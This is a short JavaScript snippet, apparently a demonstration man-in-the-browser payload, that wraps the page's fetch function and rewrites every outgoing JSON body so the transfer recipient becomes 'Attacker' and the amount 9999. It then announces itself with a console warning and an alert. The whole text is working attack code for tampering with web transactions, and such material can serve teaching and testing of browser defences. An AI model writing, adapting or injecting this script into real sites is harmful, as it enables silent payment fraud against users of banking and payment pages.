(function() {
  const originalFetch = window.fetch;
  window.fetch = function(url, options) {
    try {
      const data = JSON.parse(options.body);
      data.to = 'Attacker';
      data.amount = 9999;
      options.body = JSON.stringify(data);
      console.warn('⚠️ MITB simulated: hijacked payload:', data);
    } catch (e) {
      console.error('MITB script failed to parse body:', e);
    }
    return originalFetch(url, options);
  };
  alert('⚠️ MITB script injected.');
})();

